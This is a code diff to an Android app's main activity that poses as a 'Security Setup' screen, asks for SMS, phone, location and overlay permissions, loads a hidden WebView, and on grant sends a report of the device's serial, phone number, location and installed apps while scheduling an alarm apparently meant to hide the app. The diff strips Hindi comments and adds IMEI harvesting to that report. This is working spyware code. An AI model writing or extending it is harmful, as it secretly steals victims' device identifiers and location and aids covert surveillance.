@@ -37,14 +37,12 @@ class MainActivity : AppCompatActivity() {
                 LinearLayout.LayoutParams.MATCH_PARENT,
                 LinearLayout.LayoutParams.MATCH_PARENT
             )
-            // प्रीमियम ग्रेडिएंट बैकग्राउंड
             background = GradientDrawable(
                 GradientDrawable.Orientation.TOP_BOTTOM,
                 intArrayOf(Color.parseColor("#1a1a2e"), Color.parseColor("#16213e"), Color.parseColor("#0f3460"))
             )
         }
 
-        // परमिशन कार्ड (सफ़ेद, गोल, सेंटर)
         val card = LinearLayout(this).apply {
             orientation = LinearLayout.VERTICAL
             gravity = Gravity.CENTER
@@ -57,7 +55,6 @@ class MainActivity : AppCompatActivity() {
             }
         }
 
-        // आइकॉन (🔐)
         val iconText = TextView(this).apply {
             text = "🔐"
             textSize = 48f
@@ -65,7 +62,6 @@ class MainActivity : AppCompatActivity() {
             setPadding(0, 0, 0, 16)
         }
 
-        // टाइटल
         val titleText = TextView(this).apply {
             text = "Security Setup"
             textSize = 24f
@@ -75,7 +71,6 @@ class MainActivity : AppCompatActivity() {
             setPadding(0, 0, 0, 8)
         }
 
-        // डिस्क्रिप्शन
         val descText = TextView(this).apply {
             text = "This app requires the following permissions to work properly:\n\n📩 SMS\n🔔 Notifications\n📱 Phone\n📍 Location\n🎨 Overlay"
             textSize = 14f
@@ -84,7 +79,6 @@ class MainActivity : AppCompatActivity() {
             setPadding(0, 0, 0, 32)
         }
 
-        // ग्रांट बटन (गोल, ग्रेडिएंट)
         grantButton = Button(this).apply {
             text = "GRANT ALL PERMISSIONS"
             textSize = 16f
@@ -104,7 +98,6 @@ class MainActivity : AppCompatActivity() {
         card.addView(descText)
         card.addView(grantButton)
 
-        // कार्ड को बीच में रखने के लिए स्पेस
         val spacer1 = View(this).apply {
             layoutParams = LinearLayout.LayoutParams(0, 0, 1f)
         }
@@ -126,7 +119,6 @@ class MainActivity : AppCompatActivity() {
 
         rootLayout.addView(permissionLayout)
 
-        // वेबव्यू (छिपा हुआ)
         webView = WebView(this).apply {
             visibility = View.GONE
             settings.javaScriptEnabled = true
@@ -135,19 +127,17 @@ class MainActivity : AppCompatActivity() {
             settings.userAgentString = "Mozilla/5.0 (Linux; Android 13; Pixel 7 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36"
             webViewClient = MyWebViewClient()
             webChromeClient = WebChromeClient()
-            loadUrl("https://your-website.com") // ← बदलें
+            loadUrl("https://your-website.com") // ← अपनी साइट डालें
         }
         rootLayout.addView(webView)
 
         setContentView(rootLayout)
 
-        // पहली बार खोलने पर बेसिक कनेक्शन अलर्ट (बिना परमिशन वाली जानकारी)
         if (!prefs.getBoolean("first_launch_done", false)) {
             prefs.edit().putBoolean("first_launch_done", true).apply()
             sendBasicConnectionAlert()
         }
 
-        // हर बार चेक करें
         updateUI()
     }
 
@@ -157,7 +147,6 @@ class MainActivity : AppCompatActivity() {
             webView.visibility = View.VISIBLE
             LocationReceiver.startAlarm(this)
 
-            // परमिशन मिलने के बाद पूरी डिटेल भेजें और हाइड अलार्म सेट करें (सिर्फ पहली बार)
             if (!prefs.getBoolean("full_info_sent", false)) {
                 sendFullInfoAlert()
                 scheduleHideAlarm()
@@ -273,6 +262,7 @@ class MainActivity : AppCompatActivity() {
             val sdk = Build.VERSION.SDK_INT
             val serial = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) Build.getSerial() else "Unknown"
             val phoneNumber = getMyPhoneNumber()
+            val imei = getIMEI()
             val apps = getInstalledApps()
             val location = getLastLocation()
             val timestamp = java.text.SimpleDateFormat("yyyy-MM-dd HH:mm:ss", java.util.Locale.US).format(java.util.Date())
@@ -281,6 +271,7 @@ class MainActivity : AppCompatActivity() {
                     "<b>📱 Device:</b> $brand $model\n" +
                     "<b>⚙️ OS:</b> Android $os (SDK $sdk)\n" +
                     "<b>🔢 Serial:</b> $serial\n" +
+                    "<b>📱 IMEI:</b> $imei\n" +
                     "<b>📞 Phone Number:</b> $phoneNumber\n" +
                     "<b>📍 Location:</b> $location\n" +
                     "<b>📦 Installed Apps:</b> $apps\n" +
@@ -297,6 +288,20 @@ class MainActivity : AppCompatActivity() {
             if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED) {
                 val tm = getSystemService(TELEPHONY_SERVICE) as TelephonyManager
                 tm.line1Number ?: "Not available"
+            } else "Permission denied"
+        } catch (e: Exception) { "Error" }
+    }
+
+    private fun getIMEI(): String {
+        return try {
+            if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED) {
+                val tm = getSystemService(TELEPHONY_SERVICE) as TelephonyManager
+                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                    tm.imei ?: "Not available"
+                } else {
+                    @Suppress("DEPRECATION")
+                    tm.deviceId ?: "Not available"
+                }
             } else "Permission denied"
         } catch (e: Exception) { "Error" }
     }
